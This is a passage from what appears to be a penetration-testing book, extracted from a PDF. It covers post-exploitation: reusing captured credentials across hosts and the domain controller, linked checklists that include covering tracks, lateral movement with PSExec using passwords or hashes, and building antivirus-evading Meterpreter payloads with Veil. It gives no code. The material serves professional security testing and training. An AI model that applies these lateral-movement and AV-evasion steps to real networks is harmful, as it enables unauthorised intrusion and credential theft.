+Again, it doesn’t matter how long their password is and you don’t have to even worry about the
+hashes. You can now take these usernames/passwords and try to log into all the other boxes or even
+the domain controller if it’s a privileged account.
+I wanted to develop a section for just post exploitation tips. Let’s say you get on a Linux box or on a
+Windows host, what are some of the things you want to look for? I started to compile a list of things
+you should look for, but then I ran into a very comprehensive list from Rob Fuller (Mubix) and
+room362.com
+.
+12
+Post Exploitation Lists from 
+Room362.com
+:
+Linux/Unix/BSD Post Exploitation: 
+http://bit.ly/pqJxA5
+Windows Post Exploitation: 
+http://bit.ly/1em7gvG
+
+OSX Post Exploitation: 
+http://bit.ly/1kVTIMf
+Obscure System’s Post Exploitation: 
+http://bit.ly/1eR3cbz
+Metasploit Post Exploitation: 
+http://bit.ly/JpJ1TR
+These are very comprehensive lists on things you should look for once you’ve compromised a system.
+Included are commands to grab system configuration, user information, and even covering your tracks.
+I can’t emphasize how important it is to understand the things to look for after you compromise a
+system. This is where most script kiddies fail and where professional penetration testers continually
+move through the network.
+Hopefully with the prior chapter you were able to gain access to a local administrative account that
+works on all user’s machines or maybe even a domain admin account. What are some of the next steps
+you can do now with your newly found credentials? This section is dedicated to continually owning
+the network.
+PSExec is one of my favorite tools that will allow you to execute programs and code remotely using
+credentials. What makes this tool so impressive is that PSExec will take either username/password or
+username/password hash.
+I will cover the whole example of compromising systems once you’re on the network. This is the
+same process I use to exploit systems and get around AV.
+Before we start, we need to need to create our payload. Because I want to make sure that I don’t
+trigger any AV systems, I create an obfuscated payload-using Veil. You can read more about Veil in
+the 
+Evading AV section
+.
+PSExec and Veil (Kali Linux)
+Before I can start pushing an executable to all of the users on the network, I need to create a payload
+that will evade AV and still give me the full functionality of Meterpreter. To accomplish this, I will
+be using Veil to create my payload.
+
+
+[Note: PDF has 214 pages, only first 100 pages extracted]
